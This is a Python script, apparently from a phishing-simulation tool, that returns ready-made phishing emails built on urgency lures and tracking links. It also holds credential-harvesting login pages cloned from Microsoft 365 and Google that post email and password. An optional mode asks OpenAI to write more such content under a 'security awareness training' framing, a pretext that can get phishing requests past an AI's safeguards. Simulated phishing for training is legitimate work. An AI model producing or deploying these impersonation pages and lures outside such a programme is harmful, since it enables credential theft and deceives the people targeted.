"""
ai_generator.py
----------------
AI-powered phishing template & landing page generator.

MOCK_MODE = True  → realistic pre-built templates return karta hai (no API needed)
MOCK_MODE = False → OpenAI API use karta hai

Usage:
    # Email template generate karo
    python3 ai_generator.py --prompt "salary hike letter" --json

    # Landing page generate karo
    python3 ai_generator.py --landing --prompt "Microsoft 365 login" --json

    # Style ke saath landing page
    python3 ai_generator.py --landing --prompt "Gmail login" --style social --json
"""

import sys
import json
import argparse

# ── CONFIG ────────────────────────────────────────────────────────────────
MOCK_MODE = True
OPENAI_API_KEY = "sk-your-openai-key-here"
OPENAI_MODEL   = "gpt-3.5-turbo"

# ── MOCK EMAIL TEMPLATES ───────────────────────────────────────────────────
MOCK_EMAIL_TEMPLATES = [
    {
        "template_name": "Urgent Password Reset Required",
        "sender_name":   "IT Security Team",
        "subject":       "Action Required: Your password expires in 24 hours",
        "body_html": """<div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:30px;background:#ffffff;">
<div style="background:#0078d4;padding:20px;border-radius:6px 6px 0 0;">
  <h2 style="color:#fff;margin:0;font-size:20px;">IT Security Alert</h2>
</div>
<div style="border:1px solid #e0e0e0;border-top:none;padding:30px;border-radius:0 0 6px 6px;">
  <p style="color:#333;font-size:15px;">Dear {{name}},</p>
  <p style="color:#333;font-size:15px;">Your company account password will expire in <strong>24 hours</strong>. Please update it immediately to avoid account lockout.</p>
  <div style="text-align:center;margin:30px 0;">
    <a href="{{tracking_link}}" style="background:#0078d4;color:#ffffff;padding:14px 32px;text-decoration:none;border-radius:5px;font-weight:bold;font-size:15px;display:inline-block;">Update Password Now</a>
  </div>
  <p style="color:#666;font-size:13px;">If you did not request this, please <a href="{{report_link}}" style="color:#dc2626;">report this email</a>.</p>
  <hr style="border:none;border-top:1px solid #eee;margin:20px 0;">
  <p style="color:#999;font-size:11px;">IT Security Team | Do not reply to this email</p>
</div>
</div>
{{tracking_pixel}}"""
    },
    {
        "template_name": "Salary Revision Letter",
        "sender_name":   "HR Department",
        "subject":       "Your Salary Revision Letter is Ready",
        "body_html": """<div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:30px;background:#ffffff;">
<div style="background:#1b4332;padding:20px;border-radius:6px 6px 0 0;">
  <h2 style="color:#fff;margin:0;font-size:20px;">HR Department</h2>
</div>
<div style="border:1px solid #e0e0e0;border-top:none;padding:30px;border-radius:0 0 6px 6px;">
  <p style="color:#333;font-size:15px;">Dear {{name}},</p>
  <p style="color:#333;font-size:15px;">We are pleased to inform you that your <strong>salary revision letter</strong> for FY 2026-27 is now available. Please download and acknowledge the letter at your earliest convenience.</p>
  <div style="text-align:center;margin:30px 0;">
    <a href="{{tracking_link}}" style="background:#1b4332;color:#ffffff;padding:14px 32px;text-decoration:none;border-radius:5px;font-weight:bold;font-size:15px;display:inline-block;">📄 Download Salary Letter</a>
  </div>
  <p style="color:#666;font-size:13px;">If you have any queries, contact HR. Not you? <a href="{{report_link}}" style="color:#dc2626;">Report this email</a>.</p>
  <hr style="border:none;border-top:1px solid #eee;margin:20px 0;">
  <p style="color:#999;font-size:11px;">HR Department | Confidential</p>
</div>
</div>
{{tracking_pixel}}"""
    },
    {
        "template_name": "Invoice Payment Required",
        "sender_name":   "Accounts Department",
        "subject":       "Invoice #INV-2026 Payment Pending — Action Required",
        "body_html": """<div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:30px;background:#ffffff;">
<div style="background:#7f3f0a;padding:20px;border-radius:6px 6px 0 0;">
  <h2 style="color:#fff;margin:0;font-size:20px;">Accounts Department</h2>
</div>
<div style="border:1px solid #e0e0e0;border-top:none;padding:30px;border-radius:0 0 6px 6px;">
  <p style="color:#333;font-size:15px;">Dear {{name}},</p>
  <p style="color:#333;font-size:15px;">An invoice <strong>#INV-2026-08-001</strong> of <strong>₹45,000</strong> is pending for your approval. Please review and process it within 24 hours to avoid any late penalty.</p>
  <div style="background:#fff3cd;border:1px solid #ffc107;border-radius:6px;padding:15px;margin:20px 0;">
    <strong style="color:#664d03;">Due Date:</strong> <span style="color:#664d03;">Tomorrow, 5:00 PM</span>
  </div>
  <div style="text-align:center;margin:30px 0;">
    <a href="{{tracking_link}}" style="background:#e67e22;color:#ffffff;padding:14px 32px;text-decoration:none;border-radius:5px;font-weight:bold;font-size:15px;display:inline-block;">📎 View Invoice</a>
  </div>
  <p style="color:#666;font-size:13px;">Not you? <a href="{{report_link}}" style="color:#dc2626;">Report this email</a>.</p>
</div>
</div>
{{tracking_pixel}}"""
    },
    {
        "template_name": "Job Offer Letter",
        "sender_name":   "Recruitment Team",
        "subject":       "Congratulations! Your Job Offer Letter is Ready",
        "body_html": """<div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:30px;background:#ffffff;">
<div style="background:#1d4ed8;padding:20px;border-radius:6px 6px 0 0;">
  <h2 style="color:#fff;margin:0;font-size:20px;">Recruitment Team</h2>
</div>
<div style="border:1px solid #e0e0e0;border-top:none;padding:30px;border-radius:0 0 6px 6px;">
  <p style="color:#333;font-size:15px;">Dear {{name}},</p>
  <p style="color:#333;font-size:15px;">🎉 Congratulations! We are thrilled to offer you the position of <strong>Senior Security Analyst</strong>. Your offer letter with complete compensation details is ready for download.</p>
  <div style="background:#eff6ff;border:1px solid #bfdbfe;border-radius:6px;padding:15px;margin:20px 0;">
    <strong style="color:#1d4ed8;">Please accept within:</strong> <span style="color:#1d4ed8;">48 hours</span>
  </div>
  <div style="text-align:center;margin:30px 0;">
    <a href="{{tracking_link}}" style="background:#1d4ed8;color:#ffffff;padding:14px 32px;text-decoration:none;border-radius:5px;font-weight:bold;font-size:15px;display:inline-block;">💼 Download Offer Letter</a>
  </div>
  <p style="color:#666;font-size:13px;">Not you? <a href="{{report_link}}" style="color:#dc2626;">Report this email</a>.</p>
</div>
</div>
{{tracking_pixel}}"""
    },
    {
        "template_name": "IT Security Update Required",
        "sender_name":   "IT Helpdesk",
        "subject":       "Mandatory Security Update — Complete by Today",
        "body_html": """<div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:30px;background:#ffffff;">
<div style="background:#1a1a2e;padding:20px;border-radius:6px 6px 0 0;">
  <h2 style="color:#fff;margin:0;font-size:20px;">IT Helpdesk — Security Alert</h2>
</div>
<div style="border:1px solid #e0e0e0;border-top:none;padding:30px;border-radius:0 0 6px 6px;">
  <p style="color:#333;font-size:15px;">Dear {{name}},</p>
  <p style="color:#333;font-size:15px;">A mandatory <strong>security patch</strong> is available for your workstation. This update must be installed by <strong>today at 6:00 PM</strong> to maintain compliance with company security policy.</p>
  <div style="background:#fee2e2;border:1px solid #fca5a5;border-radius:6px;padding:15px;margin:20px 0;">
    <strong style="color:#dc2626;">⚠️ Warning:</strong> <span style="color:#dc2626;">Failure to update may result in account suspension.</span>
  </div>
  <div style="text-align:center;margin:30px 0;">
    <a href="{{tracking_link}}" style="background:#1a1a2e;color:#ffffff;padding:14px 32px;text-decoration:none;border-radius:5px;font-weight:bold;font-size:15px;display:inline-block;">🔒 Install Security Update</a>
  </div>
  <p style="color:#666;font-size:13px;">Not you? <a href="{{report_link}}" style="color:#dc2626;">Report this email</a>.</p>
</div>
</div>
{{tracking_pixel}}"""
    },
]

# ── MOCK LANDING PAGES ─────────────────────────────────────────────────────
MOCK_LANDING_PAGES = {
    "microsoft": {
        "lp_name": "Microsoft 365 Login",
        "page_title": "Sign in - Microsoft",
        "body_html": """<!DOCTYPE html>
<html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Sign in - Microsoft</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Arial,sans-serif;background:#f2f2f2;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:#fff;padding:44px;width:100%;max-width:440px;box-shadow:0 2px 6px rgba(0,0,0,0.2)}
.logo{color:#0078d4;font-size:24px;font-weight:600;margin-bottom:24px}
h1{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:16px}
p{font-size:13px;color:#333;margin-bottom:24px}
input{width:100%;padding:6px 0;border:none;border-bottom:1px solid #666;font-size:15px;outline:none;margin-bottom:24px;background:transparent}
input:focus{border-bottom-color:#0078d4}
.btn{width:100%;padding:10px;background:#0078d4;color:#fff;border:none;font-size:15px;cursor:pointer;font-weight:600}
.btn:hover{background:#106ebe}
.links{display:flex;justify-content:space-between;margin-top:16px;font-size:13px}
.links a{color:#0078d4;text-decoration:none}
</style></head>
<body>
<div class='card'>
  <div class='logo'>Microsoft</div>
  <h1>Sign in</h1>
  <p>to continue to Microsoft 365</p>
  <form method='POST'>
    <input type='hidden' name='uid' value='{{uid}}'>
    <input type='email' name='email' placeholder='Email, phone, or Skype' required>
    <input type='password' name='password' placeholder='Password' required>
    <button type='submit' class='btn'>Sign in</button>
  </form>
  <div class='links'>
    <a href='#'>No account? Create one!</a>
    <a href='#'>Forgot password?</a>
  </div>
</div>
</body></html>"""
    },
    "google": {
        "lp_name": "Google Workspace Login",
        "page_title": "Sign in - Google Accounts",
        "body_html": """<!DOCTYPE html>
<html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Sign in - Google Accounts</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Google Sans',Arial,sans-serif;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px;width:100%;max-width:450px}
.logo{text-align:center;font-size:22px;color:#202124;font-weight:400;margin-bottom:8px}
.logo span{color:#4285f4}olo span:nth-child(2){color:#ea4335}
h1{text-align:center;font-size:24px;font-weight:400;color:#202124;margin-bottom:8px}
p{text-align:center;font-size:14px;color:#5f6368;margin-bottom:32px}
input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;margin-bottom:20px}
input:focus{border-color:#4285f4;box-shadow:0 0 0 2px rgba(66,133,244,0.2)}
.btn{width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer}
.btn:hover{background:#1557b0}
.footer{text-align:center;margin-top:16px;font-size:13px}
.footer a{color:#1a73e8;text-decoration:none}
</style></head>
<body>
<div class='card'>
  <div class='logo'><b style='color:#4285f4'>G</b><b style='color:#ea4335'>o</b><b style='color:#fbbc04'>o</b><b style='color:#4285f4'>g</b><b style='color:#34a853'>l</b><b style='color:#ea4335'>e</b></div>
  <h1>Sign in</h1>
  <p>Use your Google Account</p>
  <form method='POST'>
    <input type='hidden' name='uid' value='{{uid}}'>
    <input type='email' name='email' placeholder='Email or phone' required>
    <input type='password' name='password' placeholder='Enter your password' required>
    <button type='submit' class='btn'>Next</button>
  </form>
  <div class='footer'><a href='#'>Forgot email?</a> &nbsp;|&nbsp; <a href='#'>Create account</a></div>
</div>
</body></html>"""
    },
    "default": {
        "lp_name": "Corporate Login Portal",
        "page_title": "Employee Login",
        "body_html": """<!DOCTYPE html>
<html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Employee Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#1a1a2e,#16213e);display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:#fff;padding:44px;border-radius:12px;width:100%;max-width:420px;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
.logo{text-align:center;font-size:28px;margin-bottom:8px}
h1{text-align:center;font-size:22px;color:#1a1a2e;margin-bottom:4px}
p{text-align:center;font-size:13px;color:#666;margin-bottom:28px}
label{display:block;font-size:12px;color:#555;margin-bottom:6px;font-weight:600}
input{width:100%;padding:12px 14px;border:1px solid #ddd;border-radius:6px;font-size:14px;outline:none;margin-bottom:18px}
input:focus{border-color:#1a1a2e;box-shadow:0 0 0 3px rgba(26,26,46,0.1)}
.btn{width:100%;padding:12px;background:#1a1a2e;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer}
.btn:hover{background:#0f172a}
.footer{text-align:center;margin-top:16px;font-size:12px;color:#999}
</style></head>
<body>
<div class='card'>
  <div class='logo'>🏢</div>
  <h1>Employee Portal</h1>
  <p>Sign in to your corporate account</p>
  <form method='POST'>
    <input type='hidden' name='uid' value='{{uid}}'>
    <label>Email Address</label>
    <input type='email' name='email' placeholder='your@company.com' required>
    <label>Password</label>
    <input type='password' name='password' placeholder='Enter your password' required>
    <button type='submit' class='btn'>Sign In</button>
  </form>
  <div class='footer'>© 2026 Company Portal. All rights reserved.</div>
</div>
</body></html>"""
    }
}

# ── HELPERS ────────────────────────────────────────────────────────────────
def get_mock_email_template(prompt):
    """Prompt ke keywords se best matching mock template return karta hai."""
    prompt_lower = prompt.lower()
    if any(k in prompt_lower for k in ['salary', 'hike', 'revision', 'pay']):
        return MOCK_EMAIL_TEMPLATES[1]
    elif any(k in prompt_lower for k in ['invoice', 'payment', 'bill', 'amount']):
        return MOCK_EMAIL_TEMPLATES[2]
    elif any(k in prompt_lower for k in ['job', 'offer', 'recruitment', 'congratulation']):
        return MOCK_EMAIL_TEMPLATES[3]
    elif any(k in prompt_lower for k in ['security', 'update', 'patch', 'it', 'helpdesk']):
        return MOCK_EMAIL_TEMPLATES[4]
    else:
        return MOCK_EMAIL_TEMPLATES[0]  # Default: password reset

def get_mock_landing_page(prompt, style='corporate'):
    """Prompt ke keywords se best matching mock landing page return karta hai."""
    prompt_lower = prompt.lower()
    if any(k in prompt_lower for k in ['microsoft', '365', 'outlook', 'teams', 'office']):
        return MOCK_LANDING_PAGES['microsoft']
    elif any(k in prompt_lower for k in ['google', 'gmail', 'workspace', 'gsuite']):
        return MOCK_LANDING_PAGES['google']
    else:
        # Default corporate login with custom name
        page = MOCK_LANDING_PAGES['default'].copy()
        page['lp_name'] = f"AI - {prompt}"
        page['page_title'] = f"{prompt} Login"
        return page

def generate_with_openai(prompt, is_landing=False, style='corporate'):
    """Real OpenAI API call (MOCK_MODE=False me use hota hai)."""
    try:
        import openai
        openai.api_key = OPENAI_API_KEY

        if is_landing:
            system_prompt = f"""You are a cybersecurity trainer creating realistic phishing landing pages for security awareness training.
Create a realistic {style} style login page HTML for: {prompt}
Return ONLY valid JSON with keys: lp_name, page_title, body_html
The body_html must be complete HTML with embedded CSS. Include a form with email and password fields.
Add <input type='hidden' name='uid' value='{{{{uid}}}}'>  inside the form."""
        else:
            system_prompt = """You are creating phishing simulation email templates for security awareness training.
Return ONLY valid JSON with keys: template_name, sender_name, subject, body_html
The body_html must include {{tracking_link}}, {{tracking_pixel}}, {{name}}, {{report_link}} placeholders.
Make it look realistic and professional."""

        response = openai.ChatCompletion.create(
            model=OPENAI_MODEL,
            messages=[
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": f"Create for: {prompt}"}
            ],
            temperature=0.7,
            max_tokens=2000
        )
        text = response.choices[0].message.content.strip()
        # Clean JSON
        if text.startswith('```'):
            text = text.split('```')[1]
            if text.startswith('json'):
                text = text[4:]
        return json.loads(text)
    except Exception as e:
        print(f"[ERROR] OpenAI: {e}", file=sys.stderr)
        return None

# ── MAIN ───────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--prompt', type=str, default='security alert')
    parser.add_argument('--landing', action='store_true', help='Landing page generate karo')
    parser.add_argument('--style', type=str, default='corporate')
    parser.add_argument('--json', action='store_true', help='JSON output')
    args = parser.parse_args()

    if MOCK_MODE:
        if args.landing:
            result = get_mock_landing_page(args.prompt, args.style)
        else:
            result = get_mock_email_template(args.prompt)
    else:
        result = generate_with_openai(args.prompt, args.landing, args.style)
        if not result:
            # Fallback to mock
            if args.landing:
                result = get_mock_landing_page(args.prompt, args.style)
            else:
                result = get_mock_email_template(args.prompt)

    if args.json:
        print(json.dumps(result, ensure_ascii=False))
    else:
        if args.landing:
            print(f"Page: {result.get('lp_name')}")
            print(f"Title: {result.get('page_title')}")
        else:
            print(f"Template: {result.get('template_name')}")
            print(f"Subject: {result.get('subject')}")

if __name__ == "__main__":
    main()

